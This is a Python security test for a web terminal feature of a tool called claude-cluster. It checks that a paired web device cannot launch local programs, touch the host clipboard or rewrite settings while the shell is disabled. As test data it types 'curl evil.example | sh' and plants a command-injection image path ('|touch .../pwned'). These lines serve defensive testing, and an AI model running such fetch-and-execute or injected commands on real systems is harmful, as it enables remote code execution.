#!/usr/bin/env python3
# The terminal of the page ([web] shell off, no [web] settings): no program of the computer starts from it - the editor of Ctrl+E, of the palette, of the settings (an editor is a
# shell: :!cmd), the viewer of a chip, what opens a file or a folder clicked, a program handed the terminal - its settings stay read only (the window of the simple mode, the
# questions of the map of this computer), the clipboard of the computer is neither read nor written (the keys of the prompt and of the text fields; OSC 52 goes to the device).
# Reached by a real device too, over the WebSocket. With [web] shell on the editor starts, the sections of [web] settings are written: a device keeps what it may do.
# Usage: tests/web_tty_gates.py [path/to/claude-cluster]   (default: /tmp/cc-build/claude-cluster); needs python3-pyte
"""The terminal page: no program, no setting, no clipboard of the computer past its gates."""
import base64
import fcntl
import http.cookiejar
import json
import os
import pty
import select
import signal
import socket
import struct
import subprocess
import sys
import tempfile
import termios
import time
import urllib.request

import pyte

ROOT = tempfile.mkdtemp(prefix="cc-webttygate-")
BIN = sys.argv[1] if len(sys.argv) > 1 else "/tmp/cc-build/claude-cluster"
FAKE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fake_claude.py")
BASE_PORT = 26000 + os.getpid() % 3000
REFUSED = "shell from the page is off"
PICTURE = bytes.fromhex("89504e470d0a1a0a") + b"\0" * 64
TOOLS = ("editor", "viewer", "xdg-open", "wl-paste", "wl-copy", "xclip", "xsel", "wmctrl")
PREVIEW = ("magick", "chafa")  # what draws a picture in the terminal: a device sees them, on a file only
failed = False
used = 0

def check(name: str, ok: bool, detail: str = "") -> None:
    global failed
    failed = failed or not ok
    print(("ok   " if ok else "FAIL ") + name + (f"  ({detail})" if detail and not ok else ""), flush=True)

class Core:
    # its own folder, core and web access: the settings of the computer given
    def __init__(self, web: str, ui: str = "") -> None:
        global used
        used += 1
        self.T = f"{ROOT}/{used}"
        self.port = BASE_PORT + used * 4
        self.tty = self.port + 2
        T = self.T
        self.env = {k: v for k, v in os.environ.items() if not k.startswith("CLAUDE_CLUSTER_")}
        self.env.update(CLAUDE_CLUSTER_CONFIG_DIR=f"{T}/cfg", CLAUDE_CLUSTER_DATA_DIR=f"{T}/data", CLAUDE_CLUSTER_SOCKET=f"{T}/sock", XDG_RUNTIME_DIR=f"{T}/run", XDG_CACHE_HOME=f"{T}/cache",
                        HOME=f"{T}/home", FAKE_CLAUDE_LOG=f"{T}/fake.log", TERM="xterm-256color", CLAUDE_CLUSTER_NO_SUPERVISOR="1", CLAUDE_CLUSTER_DISCOVERY_PORT=str(self.port + 1),
                        PATH=f"{T}/bin:" + os.environ.get("PATH", ""), WAYLAND_DISPLAY="wayland-9", DISPLAY=":99", WINDOWID="1")
        for folder in ("cfg", "data", "run", "cache", "home", "work", "bin", "marks"):
            os.makedirs(f"{T}/{folder}", mode=0o700)
        open(f"{T}/fake.log", "w", encoding="utf-8").close()
        # the programs of the computer: each one leaves its mark, the clipboard tools give a secret
        for tool in TOOLS + PREVIEW:
            with open(f"{T}/bin/{tool}", "w", encoding="utf-8") as out:
                out.write(f"#!/bin/sh\necho \"$@\" >> '{T}/marks/{tool}'\n" + ("echo TOPSECRET-of-the-computer\n" if tool in ("wl-paste", "xclip") else "cat > /dev/null\n" if tool in ("wl-copy", "xsel") else ""))
            os.chmod(f"{T}/bin/{tool}", 0o755)
        self.config = f"{T}/cfg/config.toml"
        with open(self.config, "w", encoding="utf-8") as config:
            config.write(f'[global]\nenabled = false\n[ui]\nnotify = false\nmachine_days = 0\nstart_menu = false\neditor = "{T}/bin/editor"\nimage_viewer = "{T}/bin/viewer"\n{ui}'
                         '[user]\nnickname = "t"\nemail = "t@t.t"\nnotes = "t"\nlanguage = "en"\n[usage]\naccount = false\n'
                         f'[commands]\nclaude = "{FAKE}"\n[web]\nenabled = true\nport = {self.port}\ntty_port = {self.tty}\nhttps = false\napprove = false\n{web}')
        self.process = subprocess.Popen([BIN, "serve", "--no-global"], env=self.env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for _ in range(100):
            if os.path.exists(f"{T}/sock"):
                break
            time.sleep(0.1)
        time.sleep(1.5)
        self.term = None

    def ask(self, request: dict) -> dict:
        s = socket.socket(socket.AF_UNIX)
        s.settimeout(30)
        s.connect(f"{self.T}/sock")
        s.sendall((json.dumps(request) + "\n").encode())
        data = b""
        while not data.endswith(b"\n"):
            chunk = s.recv(1 << 20)
            if not chunk:
                break
            data += chunk
        s.close()
        return json.loads(data or b"{}")

    def marks(self) -> list:
        return sorted(name for name in os.listdir(f"{self.T}/marks") if name not in PREVIEW)

    def terminal(self) -> "Term":
        self.term = Term(self)
        self.term.wait_for("claude-cluster", 40)  # a build with sanitizers on a busy machine: seconds
        self.term.pump(2)
        return self.term

    def close(self) -> None:
        if self.term is not None:
            self.term.kill()
        if self.process.poll() is None:
            self.process.terminate()
            try:
                self.process.wait(15)
            except subprocess.TimeoutExpired:
                self.process.kill()
        os.system(f"pkill -f {self.T} > /dev/null 2>&1")

class Term:
    # as WebTty.cpp starts it: the same program, the flag of the page in its environment
    def __init__(self, core: Core) -> None:
        self.raw = b""
        self.pid, self.fd = pty.fork()
        if self.pid == 0:
            os.execve(BIN, [BIN, "--tty"], {**core.env, "CLAUDE_CLUSTER_WEB_TTY": "1"})
        fcntl.ioctl(self.fd, termios.TIOCSWINSZ, struct.pack("HHHH", 50, 170, 0, 0))
        self.screen = pyte.Screen(170, 50)
        self.stream = pyte.ByteStream(self.screen)

    def pump(self, sec: float) -> None:
        end = time.time() + sec
        while time.time() < end:
            if select.select([self.fd], [], [], 0.05)[0]:
                try:
                    chunk = os.read(self.fd, 1 << 16)
                except OSError:
                    return
                self.raw += chunk
                try:
                    self.stream.feed(chunk)
                except TypeError:
                    pass

    def text(self) -> str:
        return "\n".join(line.rstrip() for line in self.screen.display)

    def send(self, data: bytes, wait: float = 0.6) -> None:
        os.write(self.fd, data)
        self.pump(wait)

    def where(self, word: str) -> tuple:
        for y, line in enumerate(self.screen.display):
            x = line.find(word)
            if x >= 0:
                return x, y
        return -1, -1

    def paste(self, text: str, wait: float = 2.0) -> None:
        self.send(b"\x1b[200~" + text.encode() + b"\x1b[201~", wait)

    def wait_for(self, word: str, sec: float) -> bool:
        end = time.time() + sec
        while time.time() < end and word not in self.text():
            self.pump(0.2)
        return word in self.text()

    def leave_settings(self) -> None:
        for _ in range(3):
            if "claude-cluster setup" in self.text():
                self.send(b"\x1b", 1.0)

    def click(self, x: int, y: int, button: int = 0, wait: float = 1.0) -> None:
        self.send(b"\x1b[<%d;%d;%dM\x1b[<%d;%d;%dm" % (button, x + 1, y + 1, button, x + 1, y + 1), wait)

    def kill(self) -> None:
        try:
            os.kill(self.pid, signal.SIGKILL)
            os.waitpid(self.pid, 0)
        except OSError:
            pass

def frame(op: int, payload: bytes) -> bytes:
    mask = b"\x01\x02\x03\x04"
    size = len(payload)
    head = bytes([0x80 | op]) + (bytes([0x80 | size]) if size < 126 else bytes([0x80 | 126]) + size.to_bytes(2, "big"))
    return head + mask + bytes(b ^ mask[i % 4] for i, b in enumerate(payload))

def device_keys(core: Core, keys: bytes, wait: float = 3.0) -> None:
    # a paired device on the terminal page: the code, its cookies, the WebSocket of the terminal port
    jar = http.cookiejar.CookieJar()
    web = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    out = subprocess.run([BIN, "web", "pin", "--json"], env=core.env, capture_output=True, text=True).stdout
    pin = json.loads(out or "{}").get("pin", "").replace(" ", "")
    login = urllib.request.Request(f"http://127.0.0.1:{core.port}/api/login", data=json.dumps({"pin": pin, "name": "phone"}).encode(),
                                   headers={"Content-Type": "application/json", "Origin": f"http://127.0.0.1:{core.port}"})
    web.open(login, timeout=30).read()
    cookie = "; ".join(f"{c.name}={c.value}" for c in jar)
    ws = socket.create_connection(("127.0.0.1", core.tty), timeout=30)
    key = base64.b64encode(os.urandom(16)).decode()
    ws.sendall((f"GET /api/tty/ws?cols=120&rows=40 HTTP/1.1\r\nHost: 127.0.0.1:{core.tty}\r\nOrigin: http://127.0.0.1:{core.tty}\r\nCookie: {cookie}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
                f"Sec-WebSocket-Version: 13\r\nSec-WebSocket-Key: {key}\r\n\r\n").encode())
    head = b""
    while b"\r\n\r\n" not in head:
        head += ws.recv(4096)
    check("     a device on the WebSocket of the terminal", b" 101 " in head.split(b"\r\n")[0], head[:120].decode("latin-1"))
    ws.settimeout(0.2)

    def pump(sec: float) -> None:
        end = time.time() + sec
        while time.time() < end:
            try:
                if not ws.recv(1 << 20):
                    return
            except TimeoutError:
                pass

    pump(4)
    ws.sendall(frame(2, keys))
    pump(wait)
    ws.close()

def programs(core: Core, term: Term, sid: str, allowed: bool) -> None:
    # every way to a program of the computer: nothing started and told (the shell off), or started (the shell on)
    def expect(name: str, tool: str, told: bool = True) -> None:
        marks = core.marks()
        if allowed:
            check(f"{name}: started", tool in marks, f"{marks} {term.text()[-300:]}")
            for mark in marks:
                os.remove(f"{core.T}/marks/{mark}")
        else:
            check(f"{name}: nothing started" + (", told" if told else ""), marks == [] and (not told or REFUSED in term.text()), f"{marks} {term.text()[-300:]}")

    # a chip: right click
    x, y = term.where("[Image #1] shot.png")
    check("a chip of an image in the prompt", x >= 0, term.text()[-500:])
    term.click(x + 2, y, 2)
    expect("the viewer of a chip", "viewer")
    term.send(b"\x03", 0.8)  # the prompt emptied
    # Ctrl+E
    term.send(b"\x05", 2.0)
    expect("Ctrl+E", "editor")
    check("     the interface still there", "claude-cluster" in term.text(), term.text()[-300:])
    # the editor from the palette: its titles (the core lists them for no device, a key or a click on what is left never starts it)
    if not allowed:
        for title in ("System prompt of the global session", "System prompt of the sub-sessions", "Vocabulary of the voice", "Voice words"):
            term.send(b"\x0b", 1.0)
            term.paste(title)
            term.send(b"\r", 2.0)
            expect(f"the palette, {title}", "editor", False)
            term.leave_settings()
    # the editor from the settings: the rows of the page
    for row in ("System prompt (edit", "Vocabulary (edit", "Voice words (edit"):
        term.send(b"\x1b[20~", 1.5)  # F9
        term.send(b"/", 0.6)
        term.paste(row)
        term.send(b"\r", 1.0)
        term.send(b"\r", 2.0)
        expect(f"the settings, {row})", "editor")
        term.leave_settings()
    check("     the settings closed", "claude-cluster setup" not in term.text(), term.text()[-300:])
    # a file of a display, the folder of a session: what opens them is a program of the computer
    answer = core.ask({"cmd": "display", "session": sid, "display": {"type": "file", "path": f"{core.T}/work/report.txt"}})
    check("a display of a file made", answer.get("ok") is True, json.dumps(answer)[:200])
    term.wait_for("(a click: open)", 15)
    x, y = term.where("(a click: open)")
    check("     drawn", x >= 0, term.text()[-600:])
    term.click(x, y)
    expect("     a click on it", "xdg-open")
    y = next((i for i, line in enumerate(term.screen.display) if " gate " in line and "/work" in line), -1)
    check("the folder of the session in its head", y >= 0, term.text()[:600])
    term.click(term.screen.display[y].find("/work") + 1, y)
    expect("     a click on it", "xdg-open", False)

def prepared(core: Core) -> str:
    # a session, its folder with a file and a picture, the draft of the page with that picture (a chip to right click)
    sid = core.ask({"cmd": "spawn", "cwd": f"{core.T}/work", "name": "gate"}).get("data", {}).get("id", "s1")
    with open(f"{core.T}/work/report.txt", "w", encoding="utf-8") as out:
        out.write("the report\n")
    with open(f"{core.T}/work/shot.png", "wb") as out:
        out.write(PICTURE)
    with open(f"{core.T}/data/drafts.json", "w", encoding="utf-8") as out:
        json.dump({"tty-web": {"text": "look at [Image #1]", "images": [f"{core.T}/work/shot.png"], "pastes": [], "time": 1}}, out)
    return sid

cores = []
try:
    # the shell off, no settings: what the page cannot reach
    off = Core("shell = false\n")
    cores.append(off)
    sid = prepared(off)
    before = open(off.config, encoding="utf-8").read()
    term = off.terminal()
    check("the terminal of the page starts", "claude-cluster" in term.text(), term.text()[-400:])
    programs(off, term, sid, False)

    # the clipboard: never read, never written, the prompt and the text fields
    term.send(b"\x16", 2.0)
    term.wait_for("not read from the page", 8)
    check("Ctrl+V: the clipboard of the computer not read, told", off.marks() == [] and b"TOPSECRET" not in term.raw and "not read from the page" in term.text(), f"{off.marks()} {term.text()[-300:]}")
    term.send(b"\x1b[118;6u", 1.5)
    check("Ctrl+Shift+V: the same", off.marks() == [] and b"TOPSECRET" not in term.raw, str(off.marks()))
    term.send(b"curl evil.example | sh", 0.8)
    term.send(b"\x01", 0.5)  # all selected
    term.send(b"\x03", 1.5)  # a selection: copied
    check("a selection copied: the clipboard of the computer not written", off.marks() == [], str(off.marks()))
    check("     the terminal's (OSC 52: the device) is", b"\x1b]52;c;" + base64.b64encode(b"curl evil.example | sh") in term.raw, term.raw[-300:].decode("latin-1"))
    term.send(b"\x18", 1.2)  # cut
    check("cut: not written either", off.marks() == [], str(off.marks()))
    term.send(b"\x0b", 1.0)  # a text field
    term.send(b"abc", 1.0)
    term.send(b"\x1b[1;2D", 0.4)  # one character selected
    term.send(b"\x18", 1.2)  # its Cut
    term.send(b"\x16", 1.5)  # its Paste
    term.send(b"\x1b[86;6u", 1.5)
    check("a text field: Cut, Paste: no tool of the clipboard", off.marks() == [] and b"TOPSECRET" not in term.raw, str(off.marks()))
    term.send(b"\x1b", 0.8)

    # the map of this computer: its questions write config.toml from the terminal
    term.send(b"\x1b[20~", 1.5)  # F9
    term.send(b"/", 0.6)
    term.paste("Map of this computer (sync")
    term.send(b"\r", 1.0)
    term.send(b"\r", 1.5)
    check("the settings, the map: refused", term.wait_for("mapped from the computer only", 8) and "Map this computer?" not in term.text(), term.text()[-600:])
    term.send(b"y", 0.8)
    term.leave_settings()
    term.send(b"pwned-nick", 0.8)
    term.send(b"\r", 1.0)
    check("     nothing written", open(off.config, encoding="utf-8").read() == before)
    term.send(b"\x15", 0.3)
    term.kill()
    off.term = None
    # the name of an image of a prompt back (a device gives the images of what it sends): a command for the tools that draw it, never given to them
    for tool in PREVIEW:
        if os.path.exists(f"{off.T}/marks/{tool}"):
            os.remove(f"{off.T}/marks/{tool}")
    with open(f"{off.T}/data/drafts.json", "w", encoding="utf-8") as out:
        json.dump({"tty-web": {"text": "look at [Image #1]", "images": [f"|touch {off.T}/pwned"], "pastes": [], "time": 1}}, out)
    term = off.terminal()
    x, y = term.where("[Image #1]")
    check("an image of no file in the prompt", x >= 0, term.text()[-500:])
    term.send(b"\x1b[<35;%d;%dM" % (x + 2, y + 1), 1.5)  # the mouse over its chip: its preview
    check("     its preview: neither magick nor chafa", not any(os.path.exists(f"{off.T}/marks/{tool}") for tool in PREVIEW), str(os.listdir(f"{off.T}/marks")))
    term.send(b"\x03", 0.5)
    term.kill()
    off.term = None
    # a device for real: Ctrl+E, then what would run in an editor
    device_keys(off, b"\x05")
    check("a real device, Ctrl+E: no editor", off.marks() == [], str(off.marks()))
    off.close()

    # the window of the simple mode: the settings read only
    simple = Core("shell = false\n", 'mode = "simple"\n')
    cores.append(simple)
    simple.ask({"cmd": "spawn", "cwd": f"{simple.T}/work", "name": "gate"})
    before = open(simple.config, encoding="utf-8").read()
    term = simple.terminal()
    term.send(b"\x1b[20~", 1.2)  # F9: its settings
    term.send(b"\t", 0.5)
    term.send(b"\t", 0.8)  # the assistant
    term.send(b"\x1b[B", 0.4)
    term.send(b"\x1b[B", 0.4)  # the permission mode
    term.send(b"\x1b[D", 1.0)  # round to bypassPermissions
    check("the simple mode, a setting of the assistant: read only, told", term.wait_for("read only", 8), term.text()[-500:])
    term.send(b"\r", 1.0)
    term.send(b"\r", 1.5)
    check("     config.toml not written", open(simple.config, encoding="utf-8").read() == before and "permission_mode" not in open(simple.config, encoding="utf-8").read())
    simple.close()

    # what the computer allows: the shell on (the editor, the viewer, what opens a file), a section of the settings
    on = Core("shell = true\n")
    cores.append(on)
    sid = prepared(on)
    term = on.terminal()
    programs(on, term, sid, True)
    term.kill()
    on.term = None
    device_keys(on, b"\x05")
    check("[web] shell on, a real device: Ctrl+E starts the editor", "editor" in on.marks(), str(on.marks()))
    on.close()
    allowed = Core('shell = false\nsettings = ["agent"]\n', 'mode = "simple"\n')
    cores.append(allowed)
    allowed.ask({"cmd": "spawn", "cwd": f"{allowed.T}/work", "name": "gate"})
    term = allowed.terminal()
    term.send(b"\x1b[20~", 1.2)
    term.send(b"\t", 0.5)
    term.send(b"\t", 0.8)
    term.send(b"\x1b[B", 0.4)
    term.send(b"\x1b[B", 0.4)
    term.send(b"\x1b[D", 1.0)
    term.send(b"\r", 1.0)
    term.send(b"\r", 2.0)
    check("[web] settings agent: the same keys write it", "permission_mode" in open(allowed.config, encoding="utf-8").read(), open(allowed.config, encoding="utf-8").read()[-300:])
    allowed.close()
finally:
    for core in cores:
        core.close()
    os.system(f"pkill -f {ROOT} > /dev/null 2>&1")
sys.exit(1 if failed else 0)
